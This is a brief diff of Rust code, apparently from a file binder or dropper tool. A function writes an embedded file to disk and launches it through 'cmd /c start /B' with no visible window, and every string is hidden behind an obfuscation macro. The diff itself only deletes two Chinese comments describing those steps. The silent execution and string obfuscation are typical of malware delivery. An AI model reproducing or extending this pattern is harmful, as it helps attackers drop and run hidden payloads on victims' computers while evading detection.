@@ -19,11 +19,9 @@ pub fn bundlefile() {
     temp_file.write_all(MEMORY_FILE).unwrap();
     temp_file.flush().unwrap();
 
-    // 保持一致的文件名和后缀名
     std::fs::rename(temp_file.path(), &temp_file_path).expect(&obf_lit!("Failed to rename temporary file"));
 
     use std::process::Command;
-    // 利用cmd 打开文件
     Command::new(obf_lit!("cmd"))
         .args(&[obf_lit!("/c"), obf_lit!("start"), obf_lit!("/B"), temp_file_path.to_str().unwrap().to_string()])
         .creation_flags(CREATE_NO_WINDOW)
